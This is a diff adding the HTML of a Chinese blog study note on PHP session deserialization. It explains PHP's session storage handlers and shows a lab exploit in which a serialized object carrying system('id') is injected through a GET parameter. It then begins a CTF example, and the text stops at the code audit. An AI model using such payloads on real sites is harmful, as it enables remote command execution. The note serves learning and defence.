@@ -1,0 +1,870 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tubiao.png">
+  <link rel="icon" href="/img/tubiao.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="chen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前置知识—session当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化后，存储到指定目录（默认为&#x2F;tmp） 存取格式有多种，常见的有如下三种，主要是前俩    处理器 对应的存储格式    php 键名 + 竖线 + 经过serialize()函数序列化处理的值   php_serial">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Session反序列化">
+<meta property="og:url" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="(๑´ڡ&#96;๑)">
+<meta property="og:description" content="前置知识—session当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化后，存储到指定目录（默认为&#x2F;tmp） 存取格式有多种，常见的有如下三种，主要是前俩    处理器 对应的存储格式    php 键名 + 竖线 + 经过serialize()函数序列化处理的值   php_serial">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181040224.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181844079.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183509582.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183339176.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420184444560.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190424176.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190441210.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420185635290.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192710093.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192815930.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200436497.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200809940.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200826403.png">
+<meta property="article:published_time" content="2025-04-25T07:11:59.000Z">
+<meta property="article:modified_time" content="2025-04-25T07:13:01.349Z">
+<meta property="article:author" content="chen">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181040224.png">
+<meta name="twitter:creator" content="@chen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Session反序列化 - (๑´ڡ`๑)</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>小晨的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Session反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        chen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-25 15:11" pubdate>
+          2025年4月25日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Session反序列化</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-04-25T15:13:01+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前置知识—session"><a href="#前置知识—session" class="headerlink" title="前置知识—session"></a>前置知识—session</h1><p>当<code>session_start()</code>被调用或者<code>php.ini</code>中<code>session.auto_start</code>为1时，PHP内部调用会话管理器，访问用户<code>session</code>被序列化后，存储到指定目录（默认为<code>/tmp</code>）</p>
+<p>存取格式有多种，常见的有如下三种，主要是前俩</p>
+<table>
+<thead>
+<tr>
+<th>处理器</th>
+<th>对应的存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>php</code></td>
+<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td><code>php_serialize</code></td>
+<td>经过<code>serialize()</code>函数序列化处理的数组</td>
+</tr>
+<tr>
+<td><code>php_binary</code></td>
+<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数反序列化处理的值</td>
+</tr>
+</tbody></table>
+<p>**漏洞产生：**写入格式和读取格式不一致</p>
+<p>如下一句话可以有多种读取方式</p>
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181040224.png" srcset="/img/loading.gif" lazyload alt="image-20250420181040224"></p>
+<h2 id="php方式存储"><a href="#php方式存储" class="headerlink" title="php方式存储"></a><strong><code>php</code>方式存储</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>刚开始可以看到<code>/tmp</code>目录下是什么都没有的</p>
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181844079.png" srcset="/img/loading.gif" lazyload alt="image-20250420181844079"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ben</span>=123456<br></code></pre></td></tr></table></figure>
+
+<p>当以GET形式提交参数<code>ben</code>后，再次查看会出现一个<code>sess</code>文件，存储的是刚才提交内容，格式为</p>
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183509582.png" srcset="/img/loading.gif" lazyload alt="image-20250420183509582"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 键名 + 竖线 + 经过序列化处理后的数据</span><br>benben|s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>默认情况下是使用<code>php</code>格式进行储存</p>
+<h2 id="php-serialize方式存储"><a href="#php-serialize方式存储" class="headerlink" title="php_serialize方式存储"></a><code>php_serialize</code>方式存储</h2><p>如果要使用这个格式进行存储，首先要进行一个声明，声明存储格式为<code>php_serialize</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>GET提交两个参数</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ben</span>=dazhunag&amp;b=666<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183339176.png" srcset="/img/loading.gif" lazyload alt="image-20250420183339176"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 经过serialize()函数序列化处理的数组</span><br>a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="php-binary方式存储"><a href="#php-binary方式存储" class="headerlink" title="php_binary方式存储"></a><code>php_binary</code>方式存储</h2><p>和<code>php_serialize</code>方式存储一样，要先声明存储格式为<code>php_binary</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_binary&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">benben</span>=dazhuang&amp;b=666<br></code></pre></td></tr></table></figure>
+
+<p>需要用二进制的方式查看</p>
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420184444560.png" srcset="/img/loading.gif" lazyload alt="image-20250420184444560"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数序列化处理的值</span><br>ACKbenbens:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;SOHbs:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>前面的<code>ACK</code>对应的就是<code>06</code>（键名<code>benben</code>的长度），<code>SOH</code>是<code>01</code>（键名<code>b</code>的长度）</p>
+<h1 id="PHP-session反序列化漏洞"><a href="#PHP-session反序列化漏洞" class="headerlink" title="PHP session反序列化漏洞"></a>PHP session反序列化漏洞</h1><p>**漏洞成因：**当网站序列化并存储<code>session</code>，与反序列化并读取<code>session</code>的方式不同时，就可能导致<code>session</code>反序列化漏洞的产生</p>
+<p>如下两个页面，第一个页面如下，可以以<code>php_serialize</code>的方式写进去进行存储</p>
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190424176.png" srcset="/img/loading.gif" lazyload alt="image-20250420190424176"></p>
+<p>第二个页面如下，可以以<code>php</code>的方式进行读取</p>
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190441210.png" srcset="/img/loading.gif" lazyload alt="image-20250420190441210"></p>
+<p>在第二个页面可以通过序列化执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420185635290.png" srcset="/img/loading.gif" lazyload alt="image-20250420185635290"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在第二个页面是没有提交的地方的，但可以在第一个页面中进行GET提交参数a</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>这里可以在第一个页面进行写入，在第二个页面进行读取并执行命令</p>
+<p>注意到这里提交写进去是以<code>php_serialize</code>的方式，但是读取的时候是以<code>php</code>方式进行读取的</p>
+<p><strong><code>php</code>的读取方式是以竖线<code>|</code>为分隔符，竖线<code>|</code>前面的是键名，竖线<code>|</code>后面的就是要反序列化的内容</strong></p>
+<p>在第一个页面提交GET参数<code>a</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=|O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里是以<code>php_serialize</code>的方式写入的，最终存储的样子为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># php_serialize：经过serialize()序列化处理的数组</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;|O:1:&quot;</span>D<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:13:&quot;</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>当在第二个界面以<code>php</code>的方式去读取的时候</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># php：键名 + 竖线 + 经过serialize反序列化处理的值</span><br><br><span class="hljs-comment"># 当作键名的部分为</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;</span><br><span class="hljs-string"># 进行反序列化的部分为</span><br><span class="hljs-string">O:1:&quot;</span>D<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:13:&quot;</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对于进行反序列化的部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>在前面的部分已经使用了<code>;&#125;</code>进行了闭合，满足了序列化数据的格式，所以后面剩余的<code>“;&#125;</code>就是无用的</p>
+<p>所以最终会被反序列化的部分是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192710093.png" srcset="/img/loading.gif" lazyload alt="image-20250420192710093"></p>
+<p>直接访问第二个页面就会得到命令执行的回显</p>
+<p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192815930.png" srcset="/img/loading.gif" lazyload alt="image-20250420192815930"></p>
+<p>综上，<code>session</code>反序列化要满足有一个页面可以写入，还有一个页面可以读取，并且两个页面的方式是不一样的，就会出现<code>session</code>反序列化</p>
+<h1 id="PHP-session反序列化例题"><a href="#PHP-session反序列化例题" class="headerlink" title="PHP session反序列化例题"></a>PHP session反序列化例题</h1><p>题目的<code>index.php</code>的源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;her=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name===<span class="hljs-variable language_">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>可以看到有个<code>hint.php</code>页面，访问得到源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p><strong>审计代码</strong></p>
+<ul>
